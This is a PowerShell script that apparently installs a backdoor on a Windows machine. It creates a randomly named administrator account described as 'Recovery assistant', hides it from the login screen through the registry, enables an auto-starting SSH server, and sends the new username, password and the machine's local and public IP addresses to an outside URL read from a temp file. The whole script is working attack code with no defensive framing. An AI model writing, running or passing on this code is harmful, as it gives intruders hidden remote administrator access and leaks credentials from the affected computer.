function random_text {
    return -join ((65..69) + (97..112) | Get-Random -Count 8 | ForEach-Object {[char]$_})
}

$STARTDIR = Get-Location
$NEWUSER = random_text
$WURL = Get-Content "$env:temp\u.cfg"
$LPWORD = $(random_text) + $(random_text) + $(random_text)
$LPWORD_S = (ConvertTo-securestring $LPWORD -AsPlainText -Force)
$WORKDIR = random_text
$WORKPATH = "$env:temp\$WORKDIR"
$REGFILE = random_text
$LIP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress
$RIP2 = (Invoke-WebRequest -UseBasicParsing -Uri 'http://icanhazip.com/').Content

mkdir $WORKPATH
attrib -h -s -r "$WORKPATH"
Set-Location $WORKPATH

function create_account {
    [CmdletBinding()]
    param (
        [string] $Username,
        [securestring] $Password
    )
    begin {}
    process {
        New-LocalUser "$Username" -Password $Password -FullName "$Username" -Description "Recovery assistant"
        Add-LocalGroupMember -Group "Administrators" -Member "$Username"
    }
    end {}

}
create_account -Username $NEWUSER -Password $LPWORD_S

# Hide login trough registry
$REGF = @"
Windows Registry Editor Version 5.00
[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon\SpecialAccounts\UserList]
"$NEWUSER"=dword:00000000;
"@
$REGF > "$REGFILE.reg"
reg import ".\$REGFILE.reg"
Remove-Item "$REGFILE.reg"

# Hide path
Set-Location "C:\Users"
attrib -h -s -r "$NEWUSER"
Set-Location $WORKPATH

Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'



$hash = @{ "content" = "SD:$STARTDIR,WD:$WORKDIR,LIP:$LIP,RIP2:$RIP2,U:$NEWUSER,P:$LPWORD"; }
$JSON = $hash | convertto-json

Invoke-WebRequest -Uri $WURL -Method POST -Body $JSON -Headers @{'Content-Type' = 'application/json'}


Write-Output "Remove-Item $STARTDIR/installer.ps1"